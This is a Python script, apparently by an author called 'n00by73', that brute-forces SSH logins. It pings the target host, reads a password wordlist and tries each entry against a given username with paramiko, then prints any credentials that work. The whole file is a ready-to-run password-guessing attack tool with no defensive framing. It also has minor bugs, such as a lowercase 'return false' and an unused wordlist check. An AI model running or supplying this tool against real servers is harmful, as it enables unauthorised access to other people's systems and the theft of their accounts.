from pwn import *
import subprocess
import paramiko
import sys
import os
from tqdm import tqdm

def banner():
	print("""

	   ================================================
	   
	   A simple SSH login bruteforce python script
	    
	   ================================================
	   [+] Usage:
	   python3 ssh.py <username> <host> <port> <wordlist>
	   
	   [!] NOTE: 
	   Default port is 22

	   [+] Author:
	   n00by73 (https://noobyte.vercel.app)

	   """)

def host_check(host):
	print ("[+] Checking host availability")
	try:
		subprocess.check_call(['ping', '-c', '1', '-W', '1', host])
		print("[+] '{}' is reachable".format(host))
		return True
	except subprocess.CalledProcessError:
		print("[!] '{}' not reachable. Please enter a valid hostname or IP.".format(host))
		exit(2)


def wordlist_check(password_list_path):
	print("[+] '{}' Wordlist Check..".format(password_list_path))
	if not os.path.exists(password_list_path):
		print(f"Error: File '{password_list_path}' does not exist.")
		return False

	if not os.path.isfile(password_list_path):
		print(f"Error: '{password_list_path}' is not a valid file.")
		return False

	if not os.access(password_list_path, os.R_OK):
		print(f"Error: File '{password_list_path}' is not readable.")
		return False

	print("[+] '{}' valid and readable".format(password_list_path))
	return True


def ssh_brute_force(host, port, username, password_list_path):
	print("[+] Attempting SSH brute force")
	with open(password_list_path, "r") as file:
		password_list = [line.strip() for line in file]

	for password in tqdm(password_list, desc="Progress", unit="password"):
		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			client.connect(host, port=port, username=username, password=password)
			print(f"Found valid credentials - Username: {username}, Password: {password}")
			client.close()
			return True
		except paramiko.AuthenticationException:
			pass
		except paramiko.SSHException as e:
			print(f"SSH error: {e}")
		except Exception as e:
			print(f"An error occurred: {e}")

	print("Brute-force attack unsuccessful.")
	return false

def main():
	if len(sys.argv) < 5:
		print("Usage: python3 ssh.py <username> <host> <port> <wordlist>")
		sys.exit(1)
	else:
		banner()

	username = sys.argv[1]
	port = sys.argv[3]
	password_list_path = sys.argv[4]
	host = sys.argv[2]

	
	host_check(host)
	wordlist_check(password_list_path)

	ssh_brute_force(host, port, username, password_list_path)

if __name__ == "__main__":
    main()